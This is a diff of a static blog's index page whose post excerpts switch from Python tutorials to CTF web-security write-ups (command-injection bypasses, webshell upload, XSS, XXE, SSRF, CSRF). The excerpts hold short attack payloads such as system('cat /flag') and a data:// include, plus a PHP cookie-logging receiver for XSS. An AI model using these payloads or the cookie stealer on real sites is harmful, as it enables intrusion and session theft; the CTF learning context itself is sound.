@@ -204,15 +204,15 @@
 <div class="sidebar-state">
   <div class="sidebar-state-article">
     <div>文章</div>
-    <div class="sidebar-state-number">62</div>
+    <div class="sidebar-state-number">89</div>
   </div>
   <div class="sidebar-state-category">
     <div>分类</div>
-    <div class="sidebar-state-number">3</div>
+    <div class="sidebar-state-number">4</div>
   </div>
   <div class="sidebar-state-tag">
     <div>标签</div>
-    <div class="sidebar-state-number">35</div>
+    <div class="sidebar-state-number">66</div>
   </div>
 </div>
 <div class="sidebar-social">
@@ -272,35 +272,39 @@
     <div class="post-wrapper">
   <div class="post-wrap-left" data-aos="fade-up">
     
-      <a class="post-link" href="/2024/12/26/python%E4%B9%8B%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95/" aria-label="python之魔术方法"></a>
+      <a class="post-link" href="/2025/03/05/BaseCTF2024/" aria-label="BaseCTF2024"></a>
     
     
     <div class="post-cover-left">
       
-        <img data-src="/../images/126839103p0master1200.jpg" data-sizes="auto" alt="python之魔术方法" class="lazyload">
+        <img data-src="/../images/17384736097c9d.jpg" data-sizes="auto" alt="BaseCTF2024" class="lazyload">
       
     </div>
     <div class="post-info">
       <div class="post-meta">
-        <span><span class="icon-calendar"></span>2024-12-26</span>
-        <span><span class="icon-pencil"></span>403 字</span>
-        <span><span class="icon-clock"></span>1 分钟</span>
+        <span><span class="icon-calendar"></span>2025-03-05</span>
+        <span><span class="icon-pencil"></span>6.5k 字</span>
+        <span><span class="icon-clock"></span>32 分钟</span>
       </div>
-      <h2 class="post-title">python之魔术方法</h2>
+      <h2 class="post-title">BaseCTF2024</h2>
       <article class="post-article">
         
-           init()构造方法
-关键词：
-1__init__
-作用：可以直接在创建对象时对类中属性赋值
-示例：
-12345678class a:    name=None#类中定义可不写    age=None    def __init__(self,name,age):        self.name=name        self.age=agex=a(&amp;quot;小米&amp;quot;,18)
- str()字符串方法
-关键字：
-1__str__
-此方法是当打印对象或者使用str()转换对象时被调用
-话不多说，上代码：
-12345678class person:    def __init__(s
+          A Dark Room查看源代码
+upload上传一个php文件
+里面写有一句话木马
+蚁剑连接
+ez
+HTTP是什么呀按要求改请求头就行
+喵喵喵命令执行读取flag.php
+?DT&amp;#x3D;system(cat &amp;#x2F;flag)
+MD5绕过欸MD5可以全部用数组绕过
+a[]&amp;#x3D;1&amp;amp;b[]&amp;#x3D;2…
+一起吃豆豆查看源代码
+
+在index.php里面找游戏结束的代码，发现一串base64编码，解码
+flag到手
+flag直接读取不就行了？考察php原生类
+1234567891011121314&amp;lt;?phphighlight_file(&amp;#x27;index.php
         
       </article>
     </div>
@@ -310,31 +314,270 @@
     <div class="post-wrapper">
   <div class="post-wrap-right" data-aos="fade-up">
     
-      <a class="post-link" href="/2024/12/25/python%E4%B9%8B%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1/" aria-label="python之面向对象"></a>
+      <a class="post-link" href="/2025/03/04/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF/" aria-label="命令执行绕过姿势"></a>
     
     
     <div class="post-cover-right">
       
-        <img data-src="/../images/1737907114de8a.jpg" data-sizes="auto" alt="python之面向对象" class="lazyload">
+        <img data-src="/../images/1737907114de8a.jpg" data-sizes="auto" alt="命令执行绕过姿势" class="lazyload">
       
     </div>
     <div class="post-info">
       <div class="post-meta">
-        <span><span class="icon-calendar"></span>2024-12-25</span>
-        <span><span class="icon-pencil"></span>246 字</span>
-        <span><span class="icon-clock"></span>1 分钟</span>
+        <span><span class="icon-calendar"></span>2025-03-04</span>
+        <span><span class="icon-pencil"></span>3.9k 字</span>
+        <span><span class="icon-clock"></span>17 分钟</span>
       </div>
-      <h2 class="post-title">python之面向对象</h2>
+      <h2 class="post-title">命令执行绕过姿势</h2>
       <article class="post-article">
         
-           类的定义
-12class classname:    //内容
+          小知识12345include不用括号，分号可以用?&amp;gt;代替。 //c=include$_GET[1]?&amp;gt;&amp;amp;1=data://text/plain,&amp;lt;?php system(&amp;quot;cat flag.php&amp;quot;);?&amp;gt;若想截断后面语句：%0a、%26、||&amp;lt;、&amp;lt;&amp;gt;、$&amp;#123;IFS&amp;#125;可以绕过空格过滤
 
- 类的对象
-类对象支持两种操作：实例化和属性的引用
-简单来说就是调用类和访问类的属性和方法
-举个例子：
-12345678910class class1:   a=123   b=456    def hanshu(self):#类的方法后面会讲到        return &amp;quot;hello world&amp;quot;#创建一个对象，调用类x=class1()#访问类的属性和方法print(&amp;quot;class1类的属性a,b为：&amp;quot;,x.a,x.b)print(&amp;quot;class1类的方法输出结果为：&amp;quo
+无过滤：12345678910111213141516171819通配符payload1:c=system(&amp;quot;nl fla?????&amp;quot;);payload2:c=system(&amp;quot;nl fla*&amp;
+        
+      </article>
+    </div>
+  </div>
+</div>
+  
+    <div class="post-wrapper">
+  <div class="post-wrap-left" data-aos="fade-up">
+    
+      <a class="post-link" href="/2025/02/28/php%E5%8E%9F%E7%94%9F%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C%E7%B1%BB/" aria-label="php原生文件操作类"></a>
+    
+    
+    <div class="post-cover-left">
+      
+        <img data-src="/../images/1737907114de8a.jpg" data-sizes="auto" alt="php原生文件操作类" class="lazyload">
+      
+    </div>
+    <div class="post-info">
+      <div class="post-meta">
+        <span><span class="icon-calendar"></span>2025-02-28</span>
+        <span><span class="icon-pencil"></span>830 字</span>
+        <span><span class="icon-clock"></span>3 分钟</span>
+      </div>
+      <h2 class="post-title">php原生文件操作类</h2>
+      <article class="post-article">
+        
+           我在做一个ctf新手题的时候遇到了此概念
+这类概念在反序列化中用到相对多一点
+例题先看这题源码
+1234567891011121314&amp;lt;?phphighlight_file(&amp;#x27;index.php&amp;#x27;);# 我把flag藏在一个secret文件夹里面了，所以要学会遍历啊~error_reporting(0);$J1ng = $_POST[&amp;#x27;J&amp;#x27;];$Hong = $_POST[&amp;#x27;H&amp;#x27;];$Keng = $_GET[&amp;#x27;K&amp;#x27;];$Wang = $_GET[&amp;#x27;W&amp;#x27;];$dir = new $Ken
+        
+      </article>
+    </div>
+  </div>
+</div>
+  
+    <div class="post-wrapper">
+  <div class="post-wrap-right" data-aos="fade-up">
+    
+      <a class="post-link" href="/2025/02/24/php%E5%B8%B8%E7%94%A8%E7%89%B9%E6%80%A7/" aria-label="php常用特性"></a>
+    
+    
+    <div class="post-cover-right">
+      
+        <img data-src="/../images/1737907114de8a.jpg" data-sizes="auto" alt="php常用特性" class="lazyload">
+      
+    </div>
+    <div class="post-info">
+      <div class="post-meta">
+        <span><span class="icon-calendar"></span>2025-02-24</span>
+        <span><span class="icon-pencil"></span>8.4k 字</span>
+        <span><span class="icon-clock"></span>39 分钟</span>
+      </div>
+      <h2 class="post-title">php常用特性</h2>
+      <article class="post-article">
+        
+          常见php函数12345678910substr(string,start,length)  //截取字符串strrev(string $string) //反转字符串FilesystemIterator   //获取目录文件FilesystemIteratortrim()         //用于去除字符串两端的空白字符或其他指定字符。getcwd()函数    //取得当前工作目录getcwd()函数strpos() - 查找字符串在另一字符串中第一次出现的位置（区分大小写）stripos() -查找字符串在另一字符串中第一次出现的位置（不区分大小写）strrpos() - 查找字符串在另
+        
+      </article>
+    </div>
+  </div>
+</div>
+  
+    <div class="post-wrapper">
+  <div class="post-wrap-left" data-aos="fade-up">
+    
+      <a class="post-link" href="/2025/02/23/%E7%88%86%E7%A0%B4/" aria-label="爆破"></a>
+    
+    
+    <div class="post-cover-left">
+      
+        <img data-src="/../images/126839103p0master1200.jpg" data-sizes="auto" alt="爆破" class="lazyload">
+      
+    </div>
+    <div class="post-info">
+      <div class="post-meta">
+        <span><span class="icon-calendar"></span>2025-02-23</span>
+        <span><span class="icon-pencil"></span>531 字</span>
+        <span><span class="icon-clock"></span>2 分钟</span>
+      </div>
+      <h2 class="post-title">爆破</h2>
+      <article class="post-article">
+        
+          php伪随机数原理https://blog.csdn.net/qq_35493457/article/details/124080444
+123mt_srand() //播种 Mersenne Twister 随机数生成器。 mt_rand()   //生成随机数简单来说mt_srand()通过分发seed种子，然后有了种子后，靠mt_rand()生成随机数
+
+漏洞之处：
+mt_rand()如何生成的随机整数，它与设置的seed值和调用该函数的次数有关，假设使用mt_srand(12345)进行了一次播种，那么第一次调用mt_rand生成的数值为a，第二次为b，第三次为c。所以当有人拿到与你一
+        
+      </article>
+    </div>
+  </div>
+</div>
+  
+    <div class="post-wrapper">
+  <div class="post-wrap-right" data-aos="fade-up">
+    
+      <a class="post-link" href="/2025/02/22/%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/" aria-label="信息搜集"></a>
+    
+    
+    <div class="post-cover-right">
+      
+        <img data-src="/../images/17384736097c9d.jpg" data-sizes="auto" alt="信息搜集" class="lazyload">
+      
+    </div>
+    <div class="post-info">
+      <div class="post-meta">
+        <span><span class="icon-calendar"></span>2025-02-22</span>
+        <span><span class="icon-pencil"></span>1.2k 字</span>
+        <span><span class="icon-clock"></span>4 分钟</span>
+      </div>
+      <h2 class="post-title">信息搜集</h2>
+      <article class="post-article">
+        
+          WEB-1-2-查看源码f12
+ctrl+u
+url前加vier-source:
+crtl+shift+i
+另辟蹊径：
+一直刷新网页同时一直按f12，以条件竞争打开源码
+在还没创建好环境之前打开源代码
+浏览器关闭js
+Ctrl+s 保存页面至电脑任意位置后用文本打开即可
+WEB-4-5-6-7-8-信息源码泄露一般都是根据环境的不同，一些备份文件未删除导致的代码信息泄露
+最简单的方法就是用dirsearch工具扫一下
+【web审计-源码泄露】获取源码方法，利用工具_dsstoreexp-CSDN博客]:
+WEB-9-vim缓存泄露在linux中用vi或vim编辑文件时会创建临时文件
+如果文件正
+        
+      </article>
+    </div>
+  </div>
+</div>
+  
+    <div class="post-wrapper">
+  <div class="post-wrap-left" data-aos="fade-up">
+    
+      <a class="post-link" href="/2025/02/19/CTFSHOW-XSS/" aria-label="CTFSHOW-XSS"></a>
+    
+    
+    <div class="post-cover-left">
+      
+        <img data-src="/../images/17373827994914.jpg" data-sizes="auto" alt="CTFSHOW-XSS" class="lazyload">
+      
+    </div>
+    <div class="post-info">
+      <div class="post-meta">
+        <span><span class="icon-calendar"></span>2025-02-19</span>
+        <span><span class="icon-pencil"></span>2k 字</span>
+        <span><span class="icon-clock"></span>8 分钟</span>
+      </div>
+      <h2 class="post-title">CTFSHOW-XSS</h2>
+      <article class="post-article">
+        
+          反射型xssWEB316(无过滤)在服务器上放一个接受cookie的文件xss.php
+1234567&amp;lt;?php	$cookie = $_GET[&amp;#x27;cookie&amp;#x27;];	$time = date(&amp;#x27;Y-m-d h:i:s&amp;#x27;, time());	$log = fopen(&amp;quot;cookie.txt&amp;quot;, &amp;quot;a&amp;quot;);	fwrite($log,$time.&amp;#x27;:    &amp;#x27;. $cookie . &amp;quot;\n&amp;quot;);	fclose($log);?&amp;gt;
+
+payload:
+1&amp;lt;scrip
+        
+      </article>
+    </div>
+  </div>
+</div>
+  
+    <div class="post-wrapper">
+  <div class="post-wrap-right" data-aos="fade-up">
+    
+      <a class="post-link" href="/2025/02/18/CTFSHOW-XXE/" aria-label="CTFSHOW-XXE"></a>
+    
+    
+    <div class="post-cover-right">
+      
+        <img data-src="/../images/17373827994914.jpg" data-sizes="auto" alt="CTFSHOW-XXE" class="lazyload">
+      
+    </div>
+    <div class="post-info">
+      <div class="post-meta">
+        <span><span class="icon-calendar"></span>2025-02-18</span>
+        <span><span class="icon-pencil"></span>770 字</span>
+        <span><span class="icon-clock"></span>3 分钟</span>
+      </div>
+      <h2 class="post-title">CTFSHOW-XXE</h2>
+      <article class="post-article">
+        
+          什么是xxe？XXE漏洞（XML外部实体注入）是一种安全漏洞，可以利用输入验证不严格的 XML 解析器来注入恶意代码。攻击者可以通过构造恶意的 XML 文档将其发送到应用程序中，在解析该文档时，XML 解析器会加载外部实体（如文件、URL等），以便在文档中引用它们。攻击者可以利用这个功能来执行各种攻击，例如读取服务器上的任意文件、发送内部网络请求、绕过身份验证等。
+有点像SSRF
+PHP 默认使用 libxml 来解析 XML，但是从 libxml 2.9.0 开始，它默认不再解析外部实体，导致 PHP 下的 XXE 漏洞已经逐渐消失，除非你指定 LIBLXML_NOENT 去开启外部实体解析
+        
+      </article>
+    </div>
+  </div>
+</div>
+  
+    <div class="post-wrapper">
+  <div class="post-wrap-left" data-aos="fade-up">
+    
+      <a class="post-link" href="/2025/02/17/Csrf/" aria-label="Csrf"></a>
+    
+    
+    <div class="post-cover-left">
+      
+        <img data-src="/../images/126839103p0master1200.jpg" data-sizes="auto" alt="Csrf" class="lazyload">
+      
+    </div>
+    <div class="post-info">
+      <div class="post-meta">
+        <span><span class="icon-calendar"></span>2025-02-17</span>
+        <span><span class="icon-pencil"></span>1.5k 字</span>
+        <span><span class="icon-clock"></span>5 分钟</span>
+      </div>
+      <h2 class="post-title">Csrf</h2>
+      <article class="post-article">
+        
+          XSS与csrf对比xss：攻击者发现XSS漏洞——构造代码——发送给受害人——受害人打开——攻击者获取受害人的cookie——完成攻击csrf：攻击者发现CSRF漏洞——构造代码——发送给受害人——受害人打开——受害人执行代码——完成攻击
+XSS容易发现，因为攻击者需要登陆后台完成攻击，管理员可以看到日志发现攻击者；而CSRF的攻击是管理员自己实现的，攻击者只负责构造代码。CSRF属于业务逻辑漏洞，服务器信任经过身份认证的用户XSS属于技术漏洞，客户信任服务器
+Csrf(跨站请求伪造)攻击思想攻击者诱使在一个网站上已经登录的用户在另一个网站上执行未授权的操作（例如，转账、修改个人信息等）。攻
+        
+      </article>
+    </div>
+  </div>
+</div>
+  
+    <div class="post-wrapper">
+  <div class="post-wrap-right" data-aos="fade-up">
+    
+      <a class="post-link" href="/2025/02/16/CTFSHOW%E4%B9%8BSSRF/" aria-label="CTFSHOW之SSRF"></a>
+    
+    
+    <div class="post-cover-right">
+      
+        <img data-src="/../images/17373827994914.jpg" data-sizes="auto" alt="CTFSHOW之SSRF" class="lazyload">
+      
+    </div>
+    <div class="post-info">
+      <div class="post-meta">
+        <span><span class="icon-calendar"></span>2025-02-16</span>
+        <span><span class="icon-pencil"></span>1.7k 字</span>
+        <span><span class="icon-clock"></span>7 分钟</span>
+      </div>
+      <h2 class="post-title">CTFSHOW之SSRF</h2>
+      <article class="post-article">
+        
+          web入门351(无过滤)1234567891011&amp;lt;?phperror_reporting(0);highlight_file(__FILE__);$url=$_POST[&amp;#x27;url&amp;#x27;];$ch=curl_init($url);//初始化 cURL 会话curl_setopt($ch, CURLOPT_HEADER, 0);//启用时会将头文件的信息作为数据流输出。curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);//将curl_exec()获取的信息以文件流的形式返回，而不是直接输出。$result=curl_exec($ch)
         
       </article>
     </div>
@@ -345,7 +588,7 @@
 
   <nav id="page-nav" data-aos="fade-up">
     
-    <a class="extend prev" rel="prev" href="/page/6/">&laquo; 上一页</a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/5/">5</a><a class="page-number" href="/page/6/">6</a><span class="page-number current">7</span>
+    <a class="extend prev" rel="prev" href="/page/6/">&laquo; 上一页</a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/5/">5</a><a class="page-number" href="/page/6/">6</a><span class="page-number current">7</span><a class="page-number" href="/page/8/">8</a><a class="page-number" href="/page/9/">9</a><a class="extend next" rel="next" href="/page/8/">下一页 &raquo;</a>
   </nav>
 
 
@@ -374,10 +617,10 @@
     
       <div>
         <span class="icon-brush"></span>
-        91.7k
+        120.8k
         &nbsp;|&nbsp;
         <span class="icon-coffee"></span>
-        06:19
+        08:20
       </div>
     
     
@@ -413,15 +656,15 @@
 <div class="sidebar-state">
   <div class="sidebar-state-article">
     <div>文章</div>
-    <div class="sidebar-state-number">62</div>
+    <div class="sidebar-state-number">89</div>
   </div>
   <div class="sidebar-state-category">
     <div>分类</div>
-    <div class="sidebar-state-number">3</div>
+    <div class="sidebar-state-number">4</div>
   </div>
   <div class="sidebar-state-tag">
     <div>标签</div>
-    <div class="sidebar-state-number">35</div>
+    <div class="sidebar-state-number">66</div>
   </div>
 </div>
 <div class="sidebar-social">
